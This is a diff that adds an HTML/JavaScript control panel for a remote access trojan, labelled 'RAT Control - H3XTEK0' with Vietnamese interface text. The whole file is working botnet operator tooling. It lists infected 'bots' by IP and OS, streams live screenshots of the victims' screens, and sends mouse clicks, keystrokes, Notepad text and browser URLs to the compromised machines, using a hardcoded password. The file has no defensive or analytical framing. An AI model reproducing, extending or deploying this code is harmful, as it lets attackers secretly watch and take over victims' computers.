@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT Control - H3XTEK0</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0a0f; color: #00ff88; font-family: 'Segoe UI', sans-serif; overflow: hidden; height: 100vh; }
+        .container { display: flex; height: 100vh; }
+        .sidebar { width: 260px; background: #1a1a2e; padding: 20px; border-right: 1px solid #00ff8855; overflow-y: auto; }
+        .main { flex: 1; display: flex; flex-direction: column; }
+        .screen-area { flex: 1; background: #0a0a0f; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; }
+        #screenCanvas { max-width: 100%; max-height: 100%; cursor: crosshair; image-rendering: auto; }
+        .controls { padding: 15px; background: #1a1a2e; border-top: 1px solid #00ff8855; display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
+        .controls input, .controls select, .controls button { padding: 8px 15px; background: #0a0a0f; border: 1px solid #00ff8855; color: #00ff88; border-radius: 5px; }
+        .controls button { background: #00ff88; color: #0a0a0f; cursor: pointer; font-weight: bold; }
+        .controls button:hover { background: #00cc77; }
+        .controls button.danger { background: #ff0044; color: white; }
+        .controls button.danger:hover { background: #cc0033; }
+        .bot-list { margin-top: 20px; }
+        .bot-item { padding: 10px; margin: 5px 0; background: #0a0a0f; border-radius: 5px; cursor: pointer; border-left: 3px solid #ff4444; }
+        .bot-item.online { border-left-color: #00ff88; }
+        .bot-item:hover { background: #00ff8811; }
+        .bot-item.active { background: #00ff8822; border-left-color: #00ff88; }
+        .status-bar { padding: 5px 15px; background: #1a1a2e; border-bottom: 1px solid #00ff8855; font-size: 12px; color: #888; }
+        .status-bar span { color: #00ff88; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 999; }
+        .modal-content { position: relative; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #1a1a2e; padding: 30px; border-radius: 10px; max-width: 500px; }
+        .close { float: right; cursor: pointer; color: #ff4444; font-size: 24px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="sidebar">
+            <h2>🎯 RAT Control</h2>
+            <div style="margin: 10px 0; font-size: 12px; color: #888;">
+                🔑 H3XTEK0 | <span id="botCount">0</span> bots online
+            </div>
+            <button onclick="refreshBots()" style="width:100%;padding:8px;background:#00ff88;color:#0a0a0f;border:none;border-radius:5px;cursor:pointer;">🔄 Refresh</button>
+            <div class="bot-list" id="botList">
+                <div style="color:#444;text-align:center;padding:20px;">Đang tải bot...</div>
+            </div>
+            <div style="margin-top:20px;border-top:1px solid #00ff8855;padding-top:15px;">
+                <button onclick="openNotepadModal()" style="width:100%;padding:8px;background:#444;color:white;border:none;border-radius:5px;cursor:pointer;">📝 Mở Notepad</button>
+                <button onclick="openBrowserModal()" style="width:100%;margin-top:5px;padding:8px;background:#444;color:white;border:none;border-radius:5px;cursor:pointer;">🌐 Mở Browser</button>
+            </div>
+        </div>
+        <div class="main">
+            <div class="status-bar">
+                <span id="currentBot">Chưa chọn bot</span> | 
+                <span id="statusText">Idle</span> | 
+                <span id="fpsText">0 FPS</span>
+            </div>
+            <div class="screen-area" id="screenArea">
+                <canvas id="screenCanvas"></canvas>
+                <div style="position:absolute;color:#444;font-size:14px;text-align:center;" id="placeholderText">
+                    Chọn bot để bắt đầu RAT<br>
+                    <span style="font-size:12px;color:#666;">Click vào ảnh để điều khiển chuột</span>
+                </div>
+            </div>
+            <div class="controls">
+                <input type="text" id="urlInput" placeholder="Nhập URL..." style="flex:1;min-width:200px;">
+                <button onclick="openBrowser()">🌐 Mở URL</button>
+                <input type="text" id="textInput" placeholder="Text để gõ..." style="flex:1;min-width:150px;">
+                <button onclick="sendKeyboard()">⌨️ Gửi text</button>
+                <button onclick="sendClick('left')">🖱️ Click</button>
+                <button onclick="sendClick('right')">🖱️ Right</button>
+                <button onclick="sendClick('double')">🖱️ Double</button>
+                <button class="danger" onclick="stopRAT()">⏹️ Dừng RAT</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notepad Modal -->
+    <div id="notepadModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeNotepadModal()">&times;</span>
+            <h3>📝 Notepad Remote</h3>
+            <textarea id="notepadText" placeholder="Nhập text để ghi vào notepad..." style="width:100%;height:150px;background:#0a0a0f;color:#00ff88;border:1px solid #00ff8855;border-radius:5px;padding:10px;"></textarea>
+            <button onclick="sendNotepad()" style="background:#00ff88;color:#0a0a0f;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;margin-top:10px;">Ghi vào Notepad</button>
+        </div>
+    </div>
+
+    <!-- Browser Modal -->
+    <div id="browserModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeBrowserModal()">&times;</span>
+            <h3>🌐 Mở Browser</h3>
+            <input type="text" id="browserUrlInput" placeholder="Nhập URL..." style="width:100%;padding:10px;background:#0a0a0f;color:#00ff88;border:1px solid #00ff8855;border-radius:5px;margin-top:10px;">
+            <button onclick="openBrowserFromModal()" style="background:#00ff88;color:#0a0a0f;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;margin-top:10px;">🌐 Mở URL</button>
+        </div>
+    </div>
+
+    <script>
+        let currentBotId = null;
+        let isStreaming = false;
+        let streamInterval = null;
+        let fps = 0;
+        let frameCount = 0;
+        const canvas = document.getElementById('screenCanvas');
+        const ctx = canvas.getContext('2d');
+        const API_PASSWORD = 'H3XTEK0';
+
+        function getAuth() {
+            return { 'Authorization': `Bearer ${API_PASSWORD}` };
+        }
+
+        async function refreshBots() {
+            try {
+                const res = await fetch('/api/bots/online', { headers: getAuth() });
+                const bots = await res.json();
+                document.getElementById('botCount').textContent = bots.length;
+                renderBotList(bots);
+            } catch (e) {
+                console.error('Lỗi refresh bot:', e);
+            }
+        }
+
+        function renderBotList(bots) {
+            const list = document.getElementById('botList');
+            list.innerHTML = '';
+            if (bots.length === 0) {
+                list.innerHTML = '<div style="color:#444;text-align:center;padding:20px;">Không có bot online</div>';
+                return;
+            }
+            bots.forEach(b => {
+                const div = document.createElement('div');
+                div.className = 'bot-item online';
+                if (b.bot_id === currentBotId) div.classList.add('active');
+                div.innerHTML = `
+                    <strong>${b.bot_id.slice(0, 8)}...</strong>
+                    <span style="float:right;font-size:11px;color:#888;">${b.ip || 'Unknown'}</span>
+                    <div style="font-size:10px;color:#666;">${b.os} | v${b.version}</div>
+                `;
+                div.onclick = () => selectBot(b.bot_id);
+                list.appendChild(div);
+            });
+        }
+
+        async function selectBot(botId) {
+            if (currentBotId === botId) return;
+            
+            if (isStreaming) stopStream();
+            
+            currentBotId = botId;
+            document.getElementById('currentBot').textContent = `🎯 ${botId.slice(0, 8)}...`;
+            document.getElementById('placeholderText').style.display = 'block';
+            document.getElementById('statusText').textContent = 'Connecting...';
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            
+            try {
+                const res = await fetch('/api/rat/start', {
+                    method: 'POST',
+                    headers: { ...getAuth(), 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ bot_id: botId })
+                });
+                const data = await res.json();
+                if (data.status === 'rat_session_started') {
+                    document.getElementById('statusText').textContent = 'Connected';
+                    startStream();
+                } else {
+                    alert('Lỗi khởi tạo RAT: ' + JSON.stringify(data));
+                }
+            } catch (e) {
+                alert('Lỗi kết nối RAT: ' + e.message);
+            }
+            
+            refreshBots();
+        }
+
+        function startStream() {
+            if (!currentBotId) return;
+            isStreaming = true;
+            document.getElementById('placeholderText').style.display = 'none';
+            document.getElementById('statusText').textContent = 'Streaming...';
+            
+            if (streamInterval) clearInterval(streamInterval);
+            
+            canvas.width = 800;
+            canvas.height = 600;
+            
+            fetch(`/api/rat/stream/${currentBotId}`, { headers: getAuth() });
+            
+            streamInterval = setInterval(async () => {
+                if (!currentBotId) return;
+                try {
+                    const res = await fetch(`/api/results/latest/${currentBotId}`, { headers: getAuth() });
+                    const data = await res.json();
+                    if (data && data.result && data.result.startsWith('data:image')) {
+                        const img = new Image();
+                        img.onload = function() {
+                            const aspectRatio = img.width / img.height;
+                            let w = canvas.width;
+                            let h = canvas.height;
+                            if (aspectRatio > 1) {
+                                h = w / aspectRatio;
+                            } else {
+                                w = h * aspectRatio;
+                            }
+                            ctx.clearRect(0, 0, canvas.width, canvas.height);
+                            ctx.drawImage(img, (canvas.width - w) / 2, (canvas.height - h) / 2, w, h);
+                            frameCount++;
+                            document.getElementById('statusText').textContent = 'Streaming';
+                        };
+                        img.src = data.result;
+                    }
+                } catch (e) {}
+            }, 500);
+
+            setInterval(() => {
+                fps = frameCount;
+                frameCount = 0;
+                document.getElementById('fpsText').textContent = `${fps} FPS`;
+            }, 1000);
+        }
+
+        function stopStream() {
+            isStreaming = false;
+            if (streamInterval) {
+                clearInterval(streamInterval);
+                streamInterval = null;
+            }
+            document.getElementById('statusText').textContent = 'Stopped';
+            document.getElementById('placeholderText').style.display = 'block';
+        }
+
+        async function stopRAT() {
+            if (!currentBotId) return;
+            try {
+                await fetch('/api/rat/stop', {
+                    method: 'POST',
+                    headers: { ...getAuth(), 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ bot_id: currentBotId })
+                });
+                stopStream();
+                currentBotId = null;
+                document.getElementById('currentBot').textContent = 'Chưa chọn bot';
+                refreshBots();
+            } catch (e) {
+                alert('Lỗi dừng RAT: ' + e.message);
+            }
+        }
+
+        canvas.addEventListener('click', (e) => {
+            if (!currentBotId || !isStreaming) return;
+            const rect = canvas.getBoundingClientRect();
+            const scaleX = canvas.width / rect.width;
+            const scaleY = canvas.height / rect.height;
+            const x = Math.round((e.clientX - rect.left) * scaleX);
+            const y = Math.round((e.clientY - rect.top) * scaleY);
+            sendMouseEvent('click', x, y);
+        });
+
+        canvas.addEventListener('dblclick', (e) => {
+            if (!currentBotId) return;
+            const rect = canvas.getBoundingClientRect();
+            const scaleX = canvas.width / rect.width;
+            const scaleY = canvas.height / rect.height;
+            const x = Math.round((e.clientX - rect.left) * scaleX);
+            const y = Math.round((e.clientY - rect.top) * scaleY);
+            sendMouseEvent('doubleclick', x, y);
+        });
+
+        canvas.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            if (!currentBotId) return;
+            const rect = canvas.getBoundingClientRect();
+            const scaleX = canvas.width / rect.width;
+            const scaleY = canvas.height / rect.height;
+            const x = Math.round((e.clientX - rect.left) * scaleX);
+            const y = Math.round((e.clientY - rect.top) * scaleY);
+            sendMouseEvent('rightclick', x, y);
+        });
+
+        async function sendMouseEvent(eventType, x, y) {
+            try {
+                await fetch('/api/rat/event', {
+                    method: 'POST',
+                    headers: { ...getAuth(), 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        bot_id: currentBotId,
+                        event_type: eventType,
+                        x: x,
+                        y: y
+                    })
+                });
+            } catch (e) {
+                console.error('Mouse event error:', e);
+            }
+        }
+
+        async function sendClick(type) {
+            if (!currentBotId) return;
+            await fetch('/api/rat/event', {
+                method: 'POST',
+                headers: { ...getAuth(), 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    bot_id: currentBotId,
+                    event_type: type === 'right' ? 'rightclick' : type === 'double' ? 'doubleclick' : 'click'
+                })
+            });
+        }
+
+        async function sendKeyboard() {
+            const text = document.getElementById('textInput').value.trim();
+            if (!text || !currentBotId) return;
+            await fetch('/api/rat/event', {
+                method: 'POST',
+                headers: { ...getAuth(), 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    bot_id: currentBotId,
+                    event_type: 'key',
+                    text: text
+                })
+            });
+            document.getElementById('textInput').value = '';
+        }
+
+        async function openBrowser() {
+            const url = document.getElementById('urlInput').value.trim() || 'https://www.google.com';
+            if (!currentBotId) return alert('Chọn bot trước!');
+            await fetch('/api/rat/event', {
+                method: 'POST',
+                headers: { ...getAuth(), 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    bot_id: currentBotId,
+                    event_type: 'browser',
+                    url: url
+                })
+            });
+            document.getElementById('urlInput').value = '';
+        }
+
+        function openNotepadModal() {
+            document.getElementById('notepadModal').style.display = 'block';
+        }
+
+        function closeNotepadModal() {
+            document.getElementById('notepadModal').style.display = 'none';
+        }
+
+        async function sendNotepad() {
+            const text = document.getElementById('notepadText').value.trim();
+            if (!text || !currentBotId) return alert('Nhập text và chọn bot!');
+            await fetch('/api/rat/event', {
+                method: 'POST',
+                headers: { ...getAuth(), 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    bot_id: currentBotId,
+                    event_type: 'notepad',
+                    text: text
+                })
+            });
+            document.getElementById('notepadText').value = '';
+            closeNotepadModal();
+            alert('✅ Đã gửi text đến notepad!');
+        }
+
+        function openBrowserModal() {
+            document.getElementById('browserModal').style.display = 'block';
+        }
+
+        function closeBrowserModal() {
+            document.getElementById('browserModal').style.display = 'none';
+        }
+
+        async function openBrowserFromModal() {
+            const url = document.getElementById('browserUrlInput').value.trim() || 'https://www.google.com';
+            if (!currentBotId) return alert('Chọn bot trước!');
+            await fetch('/api/rat/event', {
+                method: 'POST',
+                headers: { ...getAuth(), 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    bot_id: currentBotId,
+                    event_type: 'browser',
+                    url: url
+                })
+            });
+            document.getElementById('browserUrlInput').value = '';
+            closeBrowserModal();
+        }
+
+        setInterval(refreshBots, 10000);
+        refreshBots();
+    </script>
+</body>
+</html>
